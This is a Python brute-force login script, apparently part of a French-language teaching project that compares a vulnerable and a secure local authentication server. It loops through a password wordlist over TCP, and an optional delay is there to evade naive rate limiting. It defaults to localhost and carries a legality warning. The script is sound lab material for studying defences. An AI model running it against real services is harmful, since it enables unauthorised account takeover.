#!/usr/bin/env python3
"""
attacker/brute_force.py
=========================

Script d'ATTAQUE par force brute, à but strictement pédagogique.

Il se connecte en boucle à un serveur d'authentification (vulnerable OU
secure) et essaie une liste de mots de passe courants pour un nom
d'utilisateur donné, jusqu'à trouver le bon ou épuiser la liste.

⚠️  À utiliser UNIQUEMENT contre les serveurs de ce projet, en local. Utiliser ce type de script contre un système tiers sans
autorisation est illégal (voir README.md).

Utilisation :
    python3 attacker/brute_force.py --port 9001 --user admin
    python3 attacker/brute_force.py --port 9002 --user admin
"""

from __future__ import annotations  # Compatibilite Python 3.9 pour les annotations de type modernes

import argparse   # Pour lire les options passées en ligne de commande.
import socket     # Pour se connecter au serveur cible en TCP.
import time       # Pour mesurer la durée de l'attaque et espacer les tentatives.
from pathlib import Path


def load_wordlist(path: Path) -> list[str]:
    """Charge la liste de mots de passe candidats depuis un fichier texte."""
    # On lit le fichier, on découpe par ligne, et on retire les lignes vides
    # ou les espaces superflus en début/fin de ligne.
    with path.open(encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]


def try_login(host: str, port: int, username: str, password: str, timeout: float = 2.0) -> str:
    """
    Envoie une tentative de connexion au serveur cible et renvoie sa réponse.

    On ouvre une NOUVELLE connexion TCP à chaque tentative, exactement
    comme le ferait un vrai script d'attaque automatisé.
    """
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.settimeout(timeout)
        # Connexion au serveur cible.
        sock.connect((host, port))
        # On envoie le message au format attendu par les serveurs : "user:pass".
        message = f"{username}:{password}"
        sock.sendall(message.encode())
        # On lit la réponse du serveur (1024 octets max suffisent ici).
        response = sock.recv(1024).decode(errors="ignore").strip()
        return response


def run_attack(host: str, port: int, username: str, wordlist: list[str], delay: float) -> None:
    """Lance l'attaque : essaie chaque mot de passe de la liste, un par un."""
    print(f"[ATTACKER] Cible : {host}:{port} | Utilisateur vise : {username}")
    print(f"[ATTACKER] {len(wordlist)} mots de passe a tester.\n")

    start_time = time.perf_counter()   # On mesure le temps total de l'attaque.
    attempts = 0                        # Compteur du nombre de tentatives effectuées.

    for password in wordlist:
        attempts += 1
        try:
            response = try_login(host, port, username, password)
        except (ConnectionRefusedError, socket.timeout, OSError) as exc:
            # Si le serveur est injoignable ou ne répond pas, on arrête proprement.
            print(f"[ATTACKER] Erreur de connexion : {exc}")
            break

        # On affiche chaque tentative avec le résultat renvoyé par le serveur.
        print(f"  [{attempts:>3}] {username}:{password:<15} -> {response}")

        if response.startswith("OK"):
            # Succès : on a trouvé le bon mot de passe, l'attaque s'arrête.
            duration = time.perf_counter() - start_time
            print(f"\n[ATTACKER] SUCCES : mot de passe trouve = '{password}'")
            print(f"[ATTACKER] {attempts} tentative(s) en {duration:.2f}s.")
            return

        if response.startswith("BLOCKED"):
            # Le serveur nous a bloqués (rate limiting côté secure) : on arrête.
            duration = time.perf_counter() - start_time
            print(f"\n[ATTACKER] ECHEC : bloque par le serveur apres {attempts} tentative(s) "
                  f"({duration:.2f}s).")
            return

        # 'delay' permet de simuler un attaquant qui espace ses tentatives
        # (par exemple pour tenter de contourner un rate limiting naïf).
        # À 0 par défaut = attaque aussi rapide que possible.
        if delay > 0:
            time.sleep(delay)

    # Si on arrive ici, aucun mot de passe de la liste n'a fonctionné.
    duration = time.perf_counter() - start_time
    print(f"\n[ATTACKER] ECHEC : aucun mot de passe trouve parmi les {attempts} testes "
          f"({duration:.2f}s).")


def build_parser() -> argparse.ArgumentParser:
    """Définit les options disponibles en ligne de commande."""
    parser = argparse.ArgumentParser(
        description="Script de demonstration d'attaque par force brute (usage local uniquement)."
    )
    parser.add_argument("--host", default="127.0.0.1", help="Adresse du serveur cible (defaut: 127.0.0.1)")
    parser.add_argument("--port", type=int, required=True, help="Port du serveur cible (9001=vulnerable, 9002=secure)")
    parser.add_argument("--user", default="admin", help="Nom d'utilisateur a attaquer (defaut: admin)")
    parser.add_argument("--delay", type=float, default=0.0, help="Delai en secondes entre chaque tentative (defaut: 0)")
    parser.add_argument(
        "--wordlist",
        default=str(Path(__file__).parent.parent / "wordlist.txt"),
        help="Chemin vers le fichier de mots de passe a tester",
    )
    return parser


def main() -> None:
    parser = build_parser()
    args = parser.parse_args()

    wordlist_path = Path(args.wordlist)
    if not wordlist_path.exists():
        raise SystemExit(f"[!] Fichier de wordlist introuvable : {wordlist_path}")

    wordlist = load_wordlist(wordlist_path)
    run_attack(args.host, args.port, args.user, wordlist, args.delay)


if __name__ == "__main__":
    main()
